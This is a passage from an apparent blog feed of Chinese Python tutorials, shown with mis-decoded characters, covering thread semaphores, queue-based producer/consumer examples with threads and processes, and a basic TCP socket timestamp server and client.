çº¿é˜»å¡</li><li>å¦‚æœblocking=False,åˆ™ä¸é˜»å¡ï¼Œå¦‚è‹¥è·å–å¤±è´¥ï¼Œåˆ™è¿”å›False</li><li>å½“è®¾å®šäº†timeoutçš„å€¼ï¼Œæœ€å¤šé˜»å¡timeoutç§’ï¼Œå¦‚æœè¶…æ—¶ï¼Œè¿”å›Falseã€‚</li></ul><p><code>release()</code></p><ul><li>é‡Šæ”¾Semaphoreï¼Œå†…éƒ¨è®¡æ•°å™¨åŠ 1ï¼Œå¯ä»¥å”¤é†’ç­‰å¾…çš„çº¿ç¨‹</li></ul><p>ç»“æœä¹‹ä¸€å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411110201154.png" alt loading="lazy"></p><h3 id="ç”Ÿäº§è€…ï¼Œæ¶ˆè´¹è€…-å¤šçº¿ç¨‹"><a href="#ç”Ÿäº§è€…ï¼Œæ¶ˆè´¹è€…-å¤šçº¿ç¨‹" class="headerlink" title="ç”Ÿäº§è€…ï¼Œæ¶ˆè´¹è€…(å¤šçº¿ç¨‹)"></a>ç”Ÿäº§è€…ï¼Œæ¶ˆè´¹è€…(å¤šçº¿ç¨‹)</h3><p><strong>queueæ¨¡å—</strong></p><p><strong>ç±»</strong></p><table><thead><tr><th align="center">å±æ€§</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">Queue(maxsize=0)</td><td align="center">åˆ›å»ºä¸€ä¸ªå…ˆå…¥å…ˆå‡ºçš„é˜Ÿåˆ—ï¼Œå¦‚æœç»™å®šæœ€å¤§å€¼ï¼Œåˆ™åœ¨é˜Ÿåˆ—æ²¡æœ‰ç©ºé—´æ—¶é˜»å¡ï¼Œå¦åˆ™ï¼ˆæœªæŒ‡å®šæœ€å¤§å€¼ï¼‰ï¼Œä¸ºæ— é™é˜Ÿåˆ—</td></tr><tr><td align="center">LifoQueue(maxsize=0)</td><td align="center">åˆ›å»ºä¸€ä¸ªåå…¥å…ˆå‡ºçš„é˜Ÿåˆ—ï¼Œå¦‚æœç»™å®šæœ€å¤§å€¼ï¼Œåˆ™åœ¨é˜Ÿåˆ—æ²¡æœ‰ç©ºé—´æ—¶é˜»å¡ï¼Œå¦åˆ™ï¼ˆæœªæŒ‡å®šæœ€å¤§å€¼ï¼‰ï¼Œä¸ºæ— é™é˜Ÿåˆ—</td></tr><tr><td align="center">PriorityQueue(maxsize=0)</td><td align="center">åˆ›å»ºä¸€ä¸ªä¼˜å…ˆçº§é˜Ÿåˆ—ï¼Œå¦‚æœç»™å®šæœ€å¤§å€¼ï¼Œåˆ™åœ¨é˜Ÿåˆ—æ²¡æœ‰ç©ºé—´æ—¶é˜»å¡ï¼Œå¦åˆ™ï¼ˆæœªæŒ‡å®šæœ€å¤§å€¼ï¼‰ï¼Œä¸ºæ— é™é˜Ÿåˆ—</td></tr></tbody></table><p><strong>å¼‚å¸¸</strong></p><table><thead><tr><th align="center">å±æ€§</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">Empty</td><td align="center">å½“å¯¹ç©ºé˜Ÿåˆ—è°ƒç”¨get*()æ–¹æ³•æ—¶æŠ›å‡ºå¼‚å¸¸</td></tr><tr><td align="center">Full</td><td align="center">å½“å¯¹å·²æ»¡çš„é˜Ÿåˆ—è°ƒç”¨put*()æ–¹æ³•æ—¶æŠ›å‡ºå¼‚å¸¸</td></tr></tbody></table><p><strong>æ–¹æ³•</strong></p><table><thead><tr><th align="center">å±æ€§</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">qsize()</td><td align="center">è¿”å›é˜Ÿåˆ—å¤§å°(ç”±äºè¿”å›æ—¶é˜Ÿåˆ—å¤§å°å¯èƒ½è¢«å…¶å®ƒçº¿ç¨‹ä¿®æ”¹mï¼Œæ‰€ä»¥è¯¥å€¼ä¸ºè¿‘ä¼¼å€¼)</td></tr><tr><td align="center">empty()</td><td align="center">å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™è¿”å›Trueï¼Œå¦åˆ™è¿”å›False</td></tr><tr><td align="center">full()</td><td align="center">å¦‚æœé˜Ÿåˆ—å·²æ»¡ï¼Œåˆ™è¿”å›Trueï¼Œå¦åˆ™è¿”å›False</td></tr><tr><td align="center">put(item,block=True,timeout=None)</td><td align="center">å°†itemæ”¾å…¥é˜Ÿåˆ—ï¼Œå¦‚æœblockä¸ºTrueï¼ˆé»˜è®¤ï¼‰ï¼Œä¸”timeoutä¸ºNoneï¼Œåˆ™åœ¨æœ‰å¯ç”¨ç©ºé—´ä¹‹å‰é˜»å¡ï¼Œå¦‚æœtimeoutä¸ºæ­£å€¼ï¼Œåˆ™æœ€å¤šé˜»å¡timeoutç§’ï¼Œå¦‚æœblockä¸ºFalseï¼Œåˆ™æŠ›å‡ºEmptyå¼‚å¸¸</td></tr><tr><td align="center">put_nowait(item)</td><td align="center">å’Œput(item,Flase)ç›¸åŒ</td></tr><tr><td align="center">get(block=True,timeout-None)</td><td align="center">ä»é˜Ÿåˆ—ä¸­å–å¾—å…ƒç´ ï¼Œå¦‚æœç»™å®šäº†blockï¼ˆé0ï¼‰ï¼Œåˆ™ä¸€ç›´é˜»å¡åˆ°æœ‰å¯ç”¨çš„å…ƒç´ ä¸ºæ­¢</td></tr><tr><td align="center">get_nowait()</td><td align="center">å’Œget(False)ç›¸åŒ</td></tr><tr><td align="center">task_done()</td><td align="center">ç”¨äºè¡¨ç¤ºé˜Ÿåˆ—ä¸­çš„æŸä¸ªå…ƒç´ å·²æ‰§å®Œæˆï¼Œè¯¥æ–¹æ³•ä¼šè¢«ä¸‹é¢çš„join()ä½¿ç”¨</td></tr><tr><td align="center">join()</td><td align="center">åœ¨é˜Ÿåˆ—ä¸­æ‰€æœ‰å…ƒç´ æ‰§è¡Œå®Œæ¯•å¹¶è°ƒç”¨ä¸Šé¢çš„task_done()ä¿¡å·ä¹‹å‰ï¼Œä¿æŒé˜»å¡</td></tr></tbody></table><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue<span class="token keyword">from</span> myThread <span class="token keyword">import</span> MyThread<span class="token keyword">def</span> <span class="token function">writeQ</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">:</span>    queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"producing object for Q... "</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"size now "</span><span class="token punctuation">,</span>queue<span class="token punctuation">.</span>qsize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">randQ</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">:</span>    val <span class="token operator">=</span> queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"consumed object from Q... size now "</span><span class="token punctuation">,</span> queue<span class="token punctuation">.</span>qsize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">writer</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> loops<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment">#å†™æ•°æ®å…¥é˜Ÿåˆ—</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>        writeQ<span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reader</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> loops<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment">#ä»é˜Ÿåˆ—ä¸­å–å‡ºæ•°æ®</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>        randQ<span class="token punctuation">(</span>queue<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token comment">#æ·»åŠ å»¶æ—¶ä¾¿äºè§‚å¯Ÿ</span>funcs <span class="token operator">=</span> <span class="token punctuation">[</span>reader<span class="token punctuation">,</span> writer<span class="token punctuation">]</span>nfuncs <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>funcs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    nloops <span class="token operator">=</span> <span class="token number">5</span>    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        t <span class="token operator">=</span> MyThread<span class="token punctuation">(</span>funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token punctuation">,</span> nloops<span class="token punctuation">)</span><span class="token punctuation">,</span> funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411121807570.png" alt loading="lazy"></p><h3 id="ç”Ÿäº§è€…ï¼Œæ¶ˆè´¹è€…-å¤šè¿›ç¨‹"><a href="#ç”Ÿäº§è€…ï¼Œæ¶ˆè´¹è€…-å¤šè¿›ç¨‹" class="headerlink" title="ç”Ÿäº§è€…ï¼Œæ¶ˆè´¹è€…(å¤šè¿›ç¨‹)"></a>ç”Ÿäº§è€…ï¼Œæ¶ˆè´¹è€…(å¤šè¿›ç¨‹)</h3><p><code>multiprocessing</code>æ¨¡å—æ–¹æ³•å‚è€ƒpythonå®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.python.org/zh-cn/3.7/library/multiprocessing.html#module-multiprocessing">multiprocessing</a> â€” åŸºäºè¿›ç¨‹çš„å¹¶è¡Œ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> multiprocessing <span class="token keyword">import</span> Process<span class="token punctuation">,</span> JoinableQueue<span class="token keyword">import</span> time<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">consumer</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#ä»å¯¹åˆ—ä¸­å–å‡ºå¹¶è¿”å›å¯¹è±¡</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s åƒæ‰äº† %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">)</span>        q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#å‘é€ä¿¡å·ç»™q.join(),è¯´æ˜å·²ç»ä»é˜Ÿåˆ—ä¸­å–èµ°ä¸€ä¸ªæ•°æ®å¹¶å¤„ç†å®Œæ¯•</span><span class="token keyword">def</span> <span class="token function">producer</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> name<span class="token punctuation">,</span> food<span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">'%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>food<span class="token punctuation">)</span>    q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>res<span class="token punctuation">)</span>  <span class="token comment">#å°†resæ”¾å…¥é˜Ÿåˆ—</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s ç”Ÿäº§äº† %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">)</span>    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># ç­‰åˆ°æ¶ˆè´¹è€…æŠŠè‡ªå·±æ”¾å…¥é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰çš„æ•°æ®éƒ½å–èµ°ä¹‹åï¼Œç”Ÿäº§è€…æ‰ç»“æŸ</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    q <span class="token operator">=</span> JoinableQueue<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># ä½¿ç”¨JoinableQueue()</span>    foods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"åŒ…å­"</span><span class="token punctuation">,</span><span class="token string">"è±†æµ†"</span><span class="token punctuation">,</span><span class="token string">"æ²¹æ¡"</span><span class="token punctuation">,</span><span class="token string">"ç¨€é¥­"</span><span class="token punctuation">]</span>    producerthreads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    consumerthreads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>foods<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>producer<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> <span class="token string">'å¨å¸ˆ'</span><span class="token punctuation">,</span> foods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        producerthreads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>        producerthreads<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>foods<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>consumer<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> <span class="token string">'åƒè´§'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        consumerthreads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>        consumerthreads<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>        consumerthreads<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>producerthreads<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        producerthreads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 1ã€ä¸»è¿›ç¨‹ç­‰ç”Ÿäº§è€…p1,p2,p3ç»“æŸ</span>    <span class="token comment"># 2ã€è€Œp1ï¼Œp2ï¼Œp3ï¼Œæ˜¯åœ¨æ¶ˆè´¹è€…æŠŠæ‰€æœ‰æ•°æ®éƒ½å–å¹²å‡€ä¹‹åæ‰ä¼šç»“æŸ</span>    <span class="token comment"># 3ã€æ‰€ä»¥ä¸€æ—¦p1,p2,p3ç»“æŸäº†ï¼Œè¯æ˜æ¶ˆè´¹è€…ä¹Ÿæ²¡å¿…è¦å­˜åœ¨äº†ï¼Œåº”è¯¥éšç€ä¸»è¿›ç¨‹ä¸€å—æ­»æ‰ï¼Œå› è€Œéœ€è¦å°†ç”Ÿäº§è€…ä»¬è®¾ç½®æˆå®ˆæŠ¤è¿›ç¨‹</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"END"</span><span class="token punctuation">)</span></code></pre><p>è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410113256008.png" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-ç½‘ç»œç¼–ç¨‹</title>
      <link href="posts/c0f9c454/"/>
      <url>posts/c0f9c454/</url>
      
        <content type="html"><![CDATA[<h3 id="scoketæ¨¡å—"><a href="#scoketæ¨¡å—" class="headerlink" title="scoketæ¨¡å—"></a>scoketæ¨¡å—</h3><p>éœ€è¦è¿›è¡Œç½‘ç»œç¼–ç¨‹å°±è¦åˆ›å»ºå¥—æ¥å­—ï¼Œè€Œåœ¨pythonä¸­è¦åˆ›å»ºå¥—æ¥å­—ï¼Œå°±å¿…é¡»ä½¿ç”¨<code>socket.scoket()</code>å‡½æ•°ï¼Œå®ƒçš„ä¸€èˆ¬è¯­æ³•å¦‚ä¸‹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">socket<span class="token punctuation">(</span>scoket_family<span class="token punctuation">,</span>scoket_type<span class="token punctuation">,</span>protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p><code>scoket_family</code>å¯ä»¥æ˜¯<code>AF_UNIX</code>æˆ–<code>AF_INET(6)</code></p><ul><li><strong>AF_UNIX</strong>ï¼šUNIXï¼Œç”¨äºå•ä¸€çš„<code>UNIX</code>ç³»ç»Ÿè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡</li><li><strong>AF_INET(6)</strong>ï¼šå› ç‰¹ç½‘ï¼ŒIPv4æˆ–IPv6</li></ul><p><code>scoket_type</code>å¯ä»¥æ˜¯<code>SOCK_STREAM</code>æˆ–<code>SOCK_DGRAM</code></p><ul><li><strong>SOCK_STREAM</strong>ï¼šTCPï¼Œé¢å‘è¿æ¥çš„å¥—æ¥å­—(æµå¥—æ¥å­—ï¼Œè™šæ‹Ÿç”µè·¯)ï¼Œä¸»è¦åè®®æ˜¯TCP(ä¼ è¾“æ§åˆ¶åè®®)</li><li><strong>SOCK_DGRAM</strong>ï¼šUDPï¼Œæ— è¿æ¥çš„å¥—æ¥å­—(æ•°æ®æŠ¥)ï¼Œä¸»è¦åè®®ä¸ºUDP(ç”¨æˆ·æ•°æ®æŠ¥åè®®)protocol</li></ul><p><code>protocol</code>å‚æ•°ä¸ºä¸ç‰¹å®šçš„åœ°å€å®¶æ—ç›¸å…³çš„åè®®ï¼Œé»˜è®¤ä¸º0(æ ¹æ®åœ°å€æ ¼å¼å’Œå¥—æ¥ç±»åˆ«,è‡ªåŠ¨é€‰æ‹©ä¸€ä¸ªåˆé€‚çš„åè®®)ï¼Œè¯¥å‚æ•°é€šå¸¸çœç•¥</p><span id="more"></span><p>åˆ›å»º<code>TCP/IP</code>å¥—æ¥å­—</p><pre class="language-python" data-language="python"><code class="language-python">tcpSock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span></code></pre><p>åˆ›å»º<code>UPD/IP</code>å¥—æ¥å­—</p><pre class="language-python" data-language="python"><code class="language-python">udpSock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span></code></pre><p>æœåŠ¡å™¨å¥—æ¥å­—æ–¹æ³•</p><table><thead><tr><th align="center">åç§°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">s.bind()</td><td align="center">å°†åœ°å€(ä¸»æœºåå­—),ç»‘å®šåˆ°å¥—æ¥å­—ä¸Šï¼Œå‚æ•°éœ€è¦ä¸ºå…ƒç¥–æ ¼å¼</td></tr><tr><td align="center">s.listen()</td><td align="center">è®¾ç½®å¹¶å¯åŠ¨TCPç›‘å¬å™¨ï¼Œå‚æ•°ä¸ºæœ€å¤§æŒ‚èµ·è¿æ¥æ•°</td></tr><tr><td align="center">s.accept()</td><td align="center">è¢«åŠ¨æ¥å—TCPå®¢æˆ·ç«¯è¿æ¥ï¼Œä¸€ç›´ç­‰å¾…åˆ°è¿æ¥åˆ°è¾¾(é˜»å¡)</td></tr></tbody></table><p>å®¢æˆ·ç«¯å¥—æ¥å­—æ–¹æ³•</p><table><thead><tr><th align="center">åç§°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">s.connect()</td><td align="center">ä¸»åŠ¨å‘èµ·TCPæœåŠ¡å™¨è¿æ¥</td></tr><tr><td align="center">s.connect_ex()</td><td align="center">connectçš„æ‰©å±•ç‰ˆæœ¬ï¼Œä¼šä»¥é”™è¯¯ç å½¢å¼è¿”å›é—®é¢˜ï¼Œè€Œä¸æ˜¯æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸</td></tr></tbody></table><p>æ™®é€šå¥—æ¥å­—æ–¹æ³•</p><table><thead><tr><th align="center">åç§°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">s.recv()</td><td align="center">æ¥å—TCPæ¶ˆæ¯</td></tr><tr><td align="center">s.send()</td><td align="center">å‘é€TCPæ¶ˆæ¯</td></tr><tr><td align="center">s.sendall</td><td align="center">å®Œæ•´çš„å‘é€TCPæ¶ˆæ¯</td></tr><tr><td align="center">s.recvfrom()</td><td align="center">æ¥æ”¶UDPæ¶ˆæ¯</td></tr><tr><td align="center">s.sendto()</td><td align="center">å‘é€UDPæ¶ˆæ¯</td></tr><tr><td align="center">s.shutdown()</td><td align="center">å…³é—­è¿æ¥</td></tr><tr><td align="center">s.close()</td><td align="center">å…³é—­å¥—æ¥å­—</td></tr></tbody></table><h3 id="TCPæ—¶é—´æˆ³æœåŠ¡å™¨"><a href="#TCPæ—¶é—´æˆ³æœåŠ¡å™¨" class="headerlink" title="TCPæ—¶é—´æˆ³æœåŠ¡å™¨"></a>TCPæ—¶é—´æˆ³æœåŠ¡å™¨</h3><p>æœåŠ¡å™¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> ctimeHOST <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>PORT <span class="token operator">=</span> <span class="token number">22222</span>BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>tcpSerSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>tcpSerSock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span>tcpSerSock<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Waiting for connection..."</span><span class="token punctuation">)</span>    tcpCliSock<span class="token punctuation">,</span> addr <span class="token operator">=</span> tcpSerSock<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"...connected from:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> tcpCliSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>            <span class="token keyword">break</span>        tcpCliSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"[&#123;&#125;] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    tcpCliSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>tcpSerSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å®¢æˆ·ç«¯</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> ctimeHOST <span class="token operator">=</span> <span class="token string">"192.168.0.102"</span>PORT <span class="token operator">=</span> <span class="token number">22222</span>BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>tcpCliSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>tcpCliSock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>        <span class="token keyword">break</span>    tcpCliSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> tcpCliSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>    <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>tcpCliSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408155313046.png" alt loading="lazy"></p><h3 id="UDPæ—¶é—´æˆ³æœåŠ¡å™¨"><a 